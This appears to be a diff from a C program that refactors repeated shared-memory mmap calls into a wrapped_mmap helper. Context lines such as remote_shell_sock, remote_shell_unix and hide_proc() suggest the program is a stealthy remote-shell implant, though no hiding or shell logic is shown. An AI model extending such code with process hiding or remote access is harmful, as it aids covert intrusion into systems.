@@ -58,7 +58,7 @@ int remote_shell_sock = -1;
 int local_socks[2];
 
 //int inot_fd = -1;
-int *inot_fd;
+int* inot_fd;
 int inot_epoll = -1;
 struct inot_watch* inot_wds;
 size_t* inot_watch_count;
@@ -83,6 +83,16 @@ pid_t wrapped_fork(void) {
         exit(EXIT_FAILURE);
     }
     return pid;
+}
+
+void* wrapped_mmap(size_t size) {
+    void* out = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    if (out == MAP_FAILED) {
+        perror("mmap");
+        exit(EXIT_FAILURE);
+    }
+    return out;
 }
 
 void hide_proc(void) {
@@ -556,29 +566,11 @@ int main(void) {
     listen(local_tls_socket, 5);
     listen(remote_shell_unix, 5);
 
-    inot_wds = mmap(NULL, sizeof(struct inot_watch) * (1ul << 16), PROT_READ | PROT_WRITE,
-            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-    if (inot_wds == MAP_FAILED) {
-        perror("mmap");
-        exit(EXIT_FAILURE);
-    }
-    inot_watch_count
-            = mmap(NULL, sizeof(size_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-    if (inot_watch_count == MAP_FAILED) {
-        perror("mmap");
-        exit(EXIT_FAILURE);
-    }
+    inot_wds = wrapped_mmap(sizeof(struct inot_watch) * (1ul << 16));
+    inot_watch_count = wrapped_mmap(sizeof(size_t));
     *inot_watch_count = 0;
 
-    inot_fd
-            = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-    if (inot_fd == MAP_FAILED) {
-        perror("mmap");
-        exit(EXIT_FAILURE);
-    }
+    inot_fd = wrapped_mmap(sizeof(int));
     *inot_fd = create_inotify_descriptor();
 
     conn_sock = accept(local_tls_socket, NULL, 0);
